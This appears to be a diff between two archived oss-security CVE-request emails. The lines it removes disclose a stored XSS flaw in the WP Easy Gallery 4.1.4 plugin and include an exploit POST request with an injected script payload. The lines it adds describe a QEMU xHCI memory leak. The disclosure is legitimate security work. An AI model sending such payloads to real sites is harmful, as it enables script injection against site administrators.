@@ -1,62 +1,30 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/26/4
-Message-ID: <CADLX=aHvwog3Ss3sVQVhoi-F1A46a2X+w687MCJ+q-5Z_kBUSA@mail.gmail.com>
-Date: Tue, 26 Jan 2016 15:29:35 +0530
-From: Rahul Pratap Singh <techno.rps@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: CVE Request: WP Easy Gallery v4.1.4 Stored XSS Vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/19/8
+Message-ID: <alpine.LFD.2.20.1609200003200.13498@wniryva>
+Date: Tue, 20 Sep 2016 00:11:37 +0530 (IST)
+From: P J P <ppandit@...hat.com>
+To: oss security list <oss-security@...ts.openwall.com>
+cc: liqiang6-s@....cn
+Subject: CVE Request Qemu: usb: xhci memory leakage during device unplug
 Content-Type: text/plain; charset=utf-8
 
-#Product    : WP Easy Gallery
-#Version    : 4.1.4
-#Home page Link  : https://wordpress.org/plugins/wp-easy-gallery
+   Hello,
 
-XSS Vulnerability:
+Quick Emulator(Qemu) built with the USB xHCI controller emulation support is 
+vulnerable to a memory leakage issue. It could occur while doing a USB device 
+unplug operation; Doing so repeatedly would result in leaking host memory, 
+affecting other services on the host.
 
-----------------------------------------
-Description:
-----------------------------------------
-"custom_style" parameter is not sanitized that leads to Stored XSS.
+A privileged user inside guest could use this flaw to cause a DoS on the host 
+and/or potentially crash the Qemu process instance on the host.
 
-----------------------------------------
-Vulnerable Code:
-----------------------------------------
-File Name: wpeg-settings.php
+Upstream patch:
+---------------
+   -> https://lists.gnu.org/archive/html/qemu-devel/2016-09/msg02773.html
 
-Found at line:12
-$temp_defaults['custom_style'] = isset($_POST['custom_style']) ?
-$_POST['custom_style'] : '';
+This issue was reported by Mr Li Qiang of 360.cn Inc.
 
-Found at line:103
-<td><textarea name="custom_style" id="custom_style" rows="4"
-cols="40"><?php _e($default_options['custom_style']); ?></textarea></td>
-
-----------------------------------------
-Exploit:
-----------------------------------------
-POST /wp-admin/admin.php?page=wpeg-settings
-
-wpeg_settings=3b59e6c6ef&_wp_http_referer=abc&display_mode=abc&num_columns=abc&show_gallery_name=abc&gallery_name_alignment=abc&use_default_style=abc&drop_shadow=abc&custom_style=</textarea><input+type%3Dtext+onclick%3Dalert(%2FXSS%2F)><!--&defaultSettings=xss&Submit=Save
-
-----------------------------------------
-POC:
-----------------------------------------
-https://0x62626262.files.wordpress.com/2016/01/easy-gallery-settingsxsspoc.png
-
-Fix:
-Update to 4.1.5
-
-Disclosure Timeline:
-reported to wordpress  : 18/1/2016
-wordpress response (plugin taken down) : 19/1/2016
-vendor deployed a patch : 26/1/2016
-
-#######################################
-#        CTG SECURITY SOLUTIONS     #
-#        www.ctgsecuritysolutions.com    #
-#######################################
-
-Pub ref:
-https://0x62626262.wordpress.com/2016/01/26/wp-easy-gallery-v4-1-4-stored-xss-vulnerability/
-https://wordpress.org/plugins/wp-easy-gallery/changelog/
-
+Thank you.
+--
+Prasad J Pandit / Red Hat Product Security Team
+47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
